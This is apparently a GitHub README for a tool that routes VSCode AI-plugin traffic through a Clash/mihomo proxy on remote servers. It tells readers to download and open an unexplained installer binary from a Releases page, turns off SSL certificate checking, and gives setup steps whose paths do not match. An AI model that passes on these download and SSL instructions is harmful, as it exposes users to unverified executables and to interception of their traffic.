# 🎮 vscode-remote-vibe-coding - Easy AI Plugin Access for Remote VSCode

[![Download](https://img.shields.io/badge/Download-vscode--remote--vibe--coding-brightgreen.svg)](https://github.com/sharkfan824/vscode-remote-vibe-coding/releases)

## 🚀 Getting Started

Follow these steps to download and run the software easily.

## 📥 Download & Install

1. Click the download button above to visit the Releases page.
2. Find the latest version of the application.
3. Download the appropriate file for your operating system (Windows/macOS).
4. Once downloaded, open the file to complete the installation.

## 📂 What is vscode-remote-vibe-coding?

This application helps you use AI plugins in Visual Studio Code (VSCode) when working remotely. It operates through a local proxy to ensure you can access necessary tools without additional complexity.

## 📋 System Requirements

- Windows 10 or later, or macOS.
- Visual Studio Code installed on your local machine.
- Basic internet connection for initial downloads.

## ⚙️ Configuration Instructions

### 🌐 Setting Up Proxy for AI Plugins

To allow VSCode remote usage of AI plugins, follow these steps:

1. Open VSCode.
2. Navigate to the settings by clicking on the gear icon and selecting "Settings."
3. Search for `settings.json`.
4. Add the following configuration:

```json
{
  "http.proxy": "http://127.0.0.1:7890",
  "http.proxyStrictSSL": false
}
```

This will route all your requests through the local proxy running on port 7890.

### ⚙️ Using Remote Servers

If you need remote servers to access the internet directly (using pip, git, wget, etc.), here’s how:

1. **Install mihomo/Clash**:

   Use the following commands in your remote terminal:

   ```bash
   git clone https://github.com/mihomo/clash-for-AutoDL.git
   cd clash-for-AutoDL
   ./install.sh
   ```

2. **Create Startup Script**:

   Create a script that starts automatically:

   ```bash
   echo "sh ~/clash-installation/start.sh" >> /etc/profile.d/99-clash-autostart.sh
   ```

3. **Update Proxy Functions**:

   Add a proxy functions library to your user directory:

   ```bash
   touch ~/.proxy_funcs.sh
   ```

4. **Change Bash Configuration**:

   Modify your `.bashrc` to include your proxy:

   ```bash
   echo "source ~/.proxy_funcs.sh" >> ~/.bashrc
   ```

5. **Verify Setup**:

   After configuring your setup, restart your system and check if the proxy runs correctly using:

   ```bash
   curl google.com
   ```

## 🛠️ Troubleshooting Common Issues

1. **Unable to connect to the proxy**:
   - Check if the proxy server is running.
   - Ensure the port matches your `settings.json`.

2. **AI plugins not working**:
   - Ensure all configurations were applied as directed.
   - Restart VSCode after changes.

3. **Remote server unable to access the internet**:
   - Check your installation of mihomo/Clash.
   - Review your startup script for any errors.

## ⚠️ Frequently Asked Questions

**Q1: Do I need to configure anything specific for my operating system?**  
A1: The configuration steps provided work for both Windows and macOS. Ensure to follow the respective steps for your OS.

**Q2: Can I use this with any AI plugin?**  
A2: Yes, as long as the plugin can operate via an HTTP proxy.

**Q3: What if I face issues during installation?**  
A3: Check the troubleshooting section. If problems persist, reach out for support via this repository.

For further details or updates, visit our [GitHub page](https://github.com/sharkfan824/vscode-remote-vibe-coding/releases) regularly. Happy coding!